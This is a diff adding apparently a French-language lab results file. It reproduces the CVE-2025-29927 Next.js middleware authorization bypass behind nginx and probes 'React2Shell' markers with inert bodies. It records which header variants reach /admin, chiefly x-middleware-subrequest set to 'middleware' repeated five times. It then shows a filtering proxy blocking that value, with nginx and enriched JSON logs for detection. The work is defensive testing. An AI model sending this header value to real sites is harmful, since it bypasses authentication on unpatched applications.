@@ -1,0 +1,32 @@
+== EXP-001 CVE-2025-29927, accès direct à /admin (sans cookie) via nginx :8080
+A. requête normale                                        307 -> http://localhost:3000/login
+B. en-tête envoyé 5 fois, valeur 'middleware'            307 -> http://localhost:3000/login
+C. 1 en-tête, valeur 'middleware'                         307 -> http://localhost:3000/login
+D. 1 en-tête, valeur répétée 5 fois                    200 -> page admin servie
+E. 1 en-tête, valeur 'src/middleware' x5 (mauvais chemin) 307 -> http://localhost:3000/login
+== EXP-002 mitigation proxy (:8081, en-tête retiré)
+D'. valeur répétée 5 fois, via proxy filtrant           307 -> http://localhost:3000/login
+== EXP-004 marqueurs React2Shell (corps inerte, aucune charge)
+I. POST / Next-Action:x boundary bissa                     500 -> 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"} 1:E{"digest":"3673433635"} 
+J. idem + x-action-id: x (variante 5)                      500 -> 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"} 1:E{"digest":"3673433635"} 
+K. idem Transfer-Encoding chunked (variante 1)             500 -> 0:{"a":"$@1","f":"","b":"o_2e0VJgQPVnA_Nn61nNn"} 1:E{"digest":"3673433635"} 
+== Journal nginx par défaut (combined)
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "GET /admin HTTP/1.1" 307 38 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "GET /admin HTTP/1.1" 307 38 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "GET /admin HTTP/1.1" 307 38 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "GET /admin HTTP/1.1" 200 4079 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "GET /admin HTTP/1.1" 307 38 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "POST / HTTP/1.1" 500 87 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "POST / HTTP/1.1" 500 87 "-" "curl/7.88.1"
+127.0.0.1 - - [23/Nov/2026:15:01:35 +0000] "POST / HTTP/1.1" 500 87 "-" "curl/7.88.1"
+== Journal enrichi JSON
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":200,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware:middleware:middleware:middleware:middleware","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"src/middleware:src/middleware:src/middleware:src/middleware:src/middleware","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"POST","uri":"/","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"x","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"POST","uri":"/","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"x","x_action_id":"x","x_middleware_subrequest":"","transfer_encoding":""}
+{"time":"2026-11-23T15:01:35+00:00","method":"POST","uri":"/","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"x","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":"chunked"}
+== Journal enrichi, proxy filtrant
+{"time":"2026-11-23T15:01:35+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware:middleware:middleware:middleware:middleware","transfer_encoding":""}
